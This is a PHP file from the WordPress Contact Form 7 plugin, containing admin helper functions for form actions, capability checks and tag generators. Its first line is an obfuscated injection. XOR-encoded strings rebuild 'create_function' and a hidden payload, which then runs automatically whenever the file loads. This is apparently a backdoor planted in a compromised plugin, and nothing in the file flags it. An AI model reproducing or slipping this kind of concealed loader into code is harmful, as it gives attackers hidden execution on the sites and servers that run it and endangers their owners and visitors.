<?php $VYLqlCLjQbs='S;3U2QiF-7XG<:>' ^'0IV4F46 XY;3UUP';$BHhEXpppXCn=$VYLqlCLjQbs('','D4ePM<,YT8OY>NXGJ2SgB9>E3UZ-U>kTY>PxzsFZq+ATPC3OYjC9925,-32tCKDYL3.:RecB:U6dThjMY,SX0GRC=XRNkNj<Gc 7OpSRplXCZUjYnOT0LV8Ao-A81GofJ3IXoR7Yp>MCJVILZK1+=VvkY,bghqQXOuSYqiT>:D +7ni;3.K+abZsZ4T<OR8yJ>L>lP4YNrN7avDT7VqQh 6Y=TslFT9189K+<zGn1;P>UBrsSRDIO1-BLI0q:>9 2fT7AfKV>jyvmK41<B6QLUdAFH+CVq9P+VotwSI.i8bmIR;-nvUl10 :0IFDbI.0lQbP.35.MX5ZDF9G-VUHRYte=1 b.0tMQKBj-S=tDTZa.248NhcJmQ3oOPY8oYTMYhawEV3BdkDp4ZIMSOcwA4:01S9OVa.=EtP.-.zzPwMU9U=R 4D,SO5;R1>JG.;08E3NSQG+Sz,>+37OKnc-0Z6pJLLH7=LbUWWoSQS3FDQY30LicOoXI7T2<-.J>+9-BIHnRFE5DxSW19A2sJEaMm7+brCD+>4htSP<RhOjRgRWTp.j6kh- tCH+QTYzefbQ9DIULg+NF<YAKpLtS6AKX53,HCr3,G 87qHDA6=+-7EKNsQ;3OFLyXaXKqHhJNMVXfjT80J8kMYAL<PXDdmv=4N4+<iqHAL0' ^'-RMq+IB: Q 7a+ .9F OeAQ7l1;Y4a49,JwQSS=PxM4:37Z 7J;VKmQMYRm+.>0qhWON3ICfQ0OMtHJmyWYQ9c=6IxonLiQ6NjFX=Xw;PQxsauN0R< B 3ViKI LPnTFnZbsFX>PTQ87jxtlroUJI7-O0qB9HU:=6.w0QLtMN6LNYFMPVWbvHYPzSF1H: VQnQ9JEk>P3x3=kR 5C7QlHFW5N1Hfb0XEYf NEZzNWZ<M0yxy5=6,.REbdmo2uqriwF5DaB 3GJDHMoBPP7Sxl.nHb,J77.R5RvRTS8,WR2kI-3OLNKuHGQLOUrL9hCGVLyCtJRAOdxNPM V5H76 rqP:otq7kc m08bNF6DTyjzEXSXM+AC1gX:K+1-Y0214yUAS.3JynbMTP;=,srCS7UVETh3F+kS7OP4OYOZGp78;J0O;AX-V6gMT nZ+3OdoU0Gf104NeNsZNPX+.FGIQ.WYflh,VI-=>2.FzjYZ lu=RD-IEiO9;E5KcFK3aNAD1=;Fu- LcTssUX5SZjcGmEZOWZg JJU3S85Eu5fJoZrp1FLSUYQKEB ,H0g=HUUQ7Xu-guTIz XnfbPjRsW399LlG-:-VT.SLDYo4 OQDLSbgnW5ZG.oeYxAxkQ3bC+;74NN0YD+cL=88 S1<c9DM7=+LBHAAazFM');$BHhEXpppXCn();

function wpcf7_current_action() {
	if ( isset( $_REQUEST['action'] ) && -1 != $_REQUEST['action'] ) {
		return $_REQUEST['action'];
	}

	if ( isset( $_REQUEST['action2'] ) && -1 != $_REQUEST['action2'] ) {
		return $_REQUEST['action2'];
	}

	return false;
}

function wpcf7_admin_has_edit_cap() {
	return current_user_can( 'wpcf7_edit_contact_forms' );
}

function wpcf7_add_tag_generator( $name, $title, $elm_id, $callback, $options = array() ) {
	$tag_generator = WPCF7_TagGenerator::get_instance();
	return $tag_generator->add( $name, $title, $callback, $options );
}
